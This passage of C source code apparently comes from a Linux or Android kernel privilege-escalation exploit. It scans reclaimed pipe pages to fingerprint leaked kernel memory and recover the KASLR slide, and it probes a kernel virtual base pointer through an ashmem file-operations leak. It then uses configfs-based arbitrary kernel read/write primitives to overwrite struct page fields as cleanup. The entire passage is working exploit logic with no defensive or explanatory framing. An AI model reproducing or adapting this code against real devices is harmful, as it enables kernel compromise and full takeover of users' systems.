    if (!pipe_read_full(pipe_fds_reclaim[pipe_index][0], page,
                        scan_size)) {
      pr_warning("p0 scan partial read failed pipe=%zu size=%zu errno=%d\n",
                 pipe_index, scan_size, errno);
      return (uintptr_t)-1;
    }
    if (memcmp(page, "RMG-P0-PIPE", 11) == 0) {
      continue;
    }

    changed_pages++;
    uint64_t sampled_words[P0_FINGERPRINT_WORDS];
    for (size_t word = 0; word < P0_FINGERPRINT_WORDS; word++) {
      memcpy(&sampled_words[word], page + p0_fingerprint_offsets[word],
             sizeof(sampled_words[word]));
    }
    pr_info("p0 fingerprint sample "
            "w0=%016llx w1=%016llx w2=%016llx w3=%016llx "
            "w4=%016llx w5=%016llx w6=%016llx w7=%016llx\n",
            (unsigned long long)sampled_words[0],
            (unsigned long long)sampled_words[1],
            (unsigned long long)sampled_words[2],
            (unsigned long long)sampled_words[3],
            (unsigned long long)sampled_words[4],
            (unsigned long long)sampled_words[5],
            (unsigned long long)sampled_words[6],
            (unsigned long long)sampled_words[7]);
    for (size_t index = 0;
         index < sizeof(p0_fingerprints) / sizeof(p0_fingerprints[0]);
         index++) {
      int score = p0_fingerprint_score(page, &p0_fingerprints[index]);
      if (score > best_score) {
        second_score = best_score;
        best_score = score;
        best_slide = p0_fingerprints[index].slide;
      } else if (score > second_score) {
        second_score = score;
      }
    }
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
    pr_info("p0 fingerprint pipe=%zu best=%d second=%d "
            "source_offset=%08zx\n",
            pipe_index, best_score, second_score, best_slide);
#else
    pr_info("p0 fingerprint pipe=%zu best=%d second=%d slide=%08zx\n",
            pipe_index, best_score, second_score, best_slide);
#endif
  }

#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
  pr_info("p0 fingerprint changed=%d best=%d second=%d "
          "source_offset=%08zx\n",
          changed_pages, best_score, second_score, best_slide);
#else
  pr_info("p0 fingerprint changed=%d best=%d second=%d slide=%08zx\n",
          changed_pages, best_score, second_score, best_slide);
#endif
  if (changed_pages != 1 || best_score < 2 || best_score <= second_score) {
    return (uintptr_t)-1;
  }
  return best_slide;
}

#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
uint64_t scan_p0_virtual_base_pointer(void) {
  unsigned char page[PAGE_SIZE];
  size_t pointer_offset = data_addr(ASHMEM_MISC_FOPS) & (PAGE_SIZE - 1);
  size_t read_size = pointer_offset + sizeof(uint64_t);
  uint64_t pointer = 0;
  int changed_pages = 0;

  for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
    memset(page, 0, sizeof(page));
    if (!pipe_read_full(pipe_fds_reclaim[pipe_index][0], page, read_size)) {
      pr_warning("p0 virtual probe partial read failed pipe=%zu size=%zu "
                 "errno=%d\n", pipe_index, read_size, errno);
      return 0;
    }
    if (memcmp(page, "RMG-P0-PIPE", 11) == 0) {
      continue;
    }
    changed_pages++;
    memcpy(&pointer, page + pointer_offset, sizeof(pointer));
    pr_info("p0 virtual probe pipe=%zu offset=%zu pointer=%016llx\n",
            pipe_index, pointer_offset, (unsigned long long)pointer);
  }

  pr_info("p0 virtual probe changed=%d pointer=%016llx\n",
          changed_pages, (unsigned long long)pointer);
  if (changed_pages != 1 || (pointer >> 48) != 0xffff) {
    return 0;
  }
  return pointer;
}
#endif

int restore_p0_oracle_pages(int fd) {
  if (!p0_gate_page_struct && !p0_probe_page_struct) {
    return 1;
  }
  if (!p0_gate_page_struct || !p0_probe_page_struct) {
    return 0;
  }
  uintptr_t pages[] = {
    p0_gate_page_struct,
    p0_probe_page_struct,
  };
  uint64_t zero = 0;
  int restored = 1;

  for (size_t index = 0; index < sizeof(pages) / sizeof(pages[0]); index++) {
    uintptr_t compound_head = pages[index] + STRUCT_PAGE_COMPOUND_HEAD_OFF;
    uint64_t before = 0;
    uint64_t after = UINT64_MAX;
    ssize_t read_before = configfs_read_once(
        fd, compound_head, &before, sizeof(before));
    ssize_t write_ret = configfs_write_once(
        fd, compound_head, &zero, sizeof(zero));
    ssize_t read_after = configfs_read_once(
        fd, compound_head, &after, sizeof(after));
    pr_info("p0 restore page=%016zx read=%zd write=%zd verify=%zd "
            "before=%016llx after=%016llx\n",
            pages[index], read_before, write_ret, read_after,
            (unsigned long long)before, (unsigned long long)after);
    if (read_before != (ssize_t)sizeof(before) ||
        write_ret != (ssize_t)sizeof(zero) ||
        read_after != (ssize_t)sizeof(after) || after != 0) {
      restored = 0;
    }
  }
  return restored;
}
#endif
